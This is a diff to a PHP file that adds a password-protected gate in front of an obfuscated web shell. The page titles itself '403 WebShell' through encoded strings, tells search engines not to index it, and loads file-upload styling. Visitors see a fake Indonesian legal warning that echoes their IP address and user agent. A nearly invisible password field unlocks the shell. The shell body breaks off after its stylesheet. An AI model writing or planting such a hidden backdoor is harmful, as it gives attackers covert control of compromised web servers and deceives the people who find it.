@@ -1,4 +1,112 @@
 <?php
+session_start();
+
+$hashed_password = '$2a$12$AF.sjRyPPrIw9pwlRq6zsuF2nEQ5/r0kJ7V6fVXAxIx1nNcqYtjl6';
+
+function isAuthenticated() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $hashed_password)) {
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = "Denied!";
+    }
+}
+
+if (!isAuthenticated()) :
+?>
+<?php
+date_default_timezone_set('Asia/Jakarta'); // Set zona waktu ke Jakarta
+
+$ip = $_SERVER['REMOTE_ADDR']; // Ambil alamat IP pengunjung
+$waktu = date("d-m-Y H:i:s"); // Ambil waktu kunjungan
+$user_agent = $_SERVER['HTTP_USER_AGENT']; // Ambil user agent pengunjung
+
+// Deteksi jenis perangkat
+if (preg_match('/mobile/i', $user_agent)) {
+    $device = "Perangkat Mobile";
+} elseif (preg_match('/tablet/i', $user_agent)) {
+    $device = "Tablet";
+} else {
+    $device = "Komputer/PC";
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Peringatan Keamanan</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #00ffcc;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            border: 2px solid #00ffcc;
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            background-color: #14161a;
+            box-shadow: 0px 0px 15px rgba(0, 255, 204, 0.5);
+        }
+        h1 {
+            color: #ff0033;
+            text-transform: uppercase;
+        }
+        .info {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        .glow {
+            text-shadow: 0px 0px 8px #00ffcc;
+        }
+        .warning {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        .law {
+            color: #ff0033;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="glow">⚠️ PERINGATAN KEAMANAN ⚠️</h1>
+        <p class="info">Kami telah mendeteksi aktivitas mencurigakan dari alamat IP Anda!</p>
+        <p class="info"><strong>Alamat IP:</strong> <?php echo $ip; ?></p>
+        <p class="info"><strong>Waktu Kunjungan:</strong> <?php echo $waktu; ?></p>
+        <p class="info"><strong>Perangkat:</strong> <?php echo $device; ?></p>
+        <p class="info"><strong>User-Agent:</strong> <?php echo $user_agent; ?></p>
+        <p class="info">Jika Anda merasa ini adalah kesalahan, segera hubungi administrator.</p>
+
+        <p class="warning">⚠️ PERINGATAN HUKUM ⚠️</p>
+        <p class="law">Upaya akses ilegal terhadap sistem ini dapat dikenakan sanksi pidana berdasarkan Undang-Undang ITE Pasal 30 Ayat (1) - (3) dengan ancaman hukuman hingga 8 tahun penjara dan denda maksimal Rp 800 juta.</p>
+        <p class="info">Seluruh aktivitas dicatat dan dapat digunakan sebagai bukti hukum.</p>
+    <form method="POST">
+        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
+        <input type="password" name="password" placeholder="" required style="background: transparent; border: 0px solid #ccc; color: #fff; padding: 8px; border-radius: 5px;">
+    </form>
+    </div>
+</body>
+</html>
+<?php
+    exit;
+endif;
+?>
+<?php
  goto EPw7X; b_GNi: echo "\74\164\x69\x74\154\x65\76\x34\x30\x33" . "\x57\145\x62" . "\x53\150" . "\145\x6c" . "\x6c\74\x2f\x74\x69\x74\x6c\145\76"; goto fj3E8; EPw7X: ?>
 <!doctypehtml><html><head><?php  goto b_GNi; fj3E8: ?>
 <meta content="noindex"name="robots"></head><body bgcolor="#1f1f1f"text="#ffffff"><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"rel="stylesheet"><style>@import url(https://fonts.googleapis.com/css?family=Dosis);@import url(https://fonts.googleapis.com/css?family=Bungee);@import url(https://fonts.googleapis.com/css?family=Russo+One);body{font-family:Consolas,cursive;text-shadow:0 0 1px #757575}body::-webkit-scrollbar{width:12px}body::-webkit-scrollbar-track{background:#1f1f1f}body::-webkit-scrollbar-thumb{background-color:#1f1f1f;border:3px solid gray}#content tr:hover{background-color:#636263;text-shadow:0 0 10px #fff}#content .first{background-color:#5e5e5e}#content .first:hover{background-color:#25383c;text-shadow:0 0 1px #757575}table{border:1px #000 dotted;table-layout:fixed}td{word-wrap:break-word}a{color:#df5;text-decoration:none}a:hover{color:#000;text-shadow:0 0 10px #fff}input,select,textarea{border:1px #000 solid;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px}.gas{background-color:#1f1f1f;color:#fff;cursor:pointer}select{background-color:transparent;color:#fff}select:after{cursor:pointer}.linka{background-color:transparent;color:#fff}.up{background-color:transparent;color:#fff}option{background-color:#1f1f1f}.btf{background:0 0;border:1px #fff solid;cursor:pointer}::-webkit-file-upload-button{background:0 0;color:#fff;border-color:#fff;cursor:pointer}</style><center>
